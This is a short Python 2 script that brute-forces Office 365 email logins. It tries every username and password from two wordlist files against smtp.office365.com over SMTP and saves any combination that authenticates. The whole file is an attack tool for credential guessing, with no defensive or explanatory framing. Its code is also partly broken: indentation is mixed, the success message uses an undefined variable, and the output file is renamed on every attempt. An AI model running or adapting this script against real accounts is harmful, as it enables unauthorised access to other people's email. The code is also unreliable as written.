import smtplib
import os
import time

def file_name():
	t = time.strftime('%Y-%m-%d',time.localtime())
	suffix = ".txt"
	fullname = t+suffix
	return fullname

def conn(u,p):
	s = smtplib.SMTP(host='smtp.office365.com', port=587)
	s.starttls()
	r = s.login(u,p)
	return r
	
def main():
    with open('/mailuser.txt','r') as user:
        with open('/mailpass.txt','r') as password:
            users = user.readlines()
            passwords = password.readlines()
            for u in users:
                for p in passwords:
                    u = u.strip('\n')
                    p = p.strip('\n')
                    try:
                    	res = conn(u,p)
                    	#print res
                    	with open('/demo.txt','w') as f:
                    		print os.getcwd()
                    		#change work directory
                    		os.chdir('/plan/')
                    		os.rename('demo.txt',file_name())
                    		if res[0] == 235:
								f.write(u)
								f.write('/')
								f.write(p)
								f.write('\n')
								print 'find account/pass',u,'/',p,e

                    except Exception as e:
                    	print 'wrong account/pass',u,'/',p,e
					
					
if __name__ == '__main__':
	main()

		





    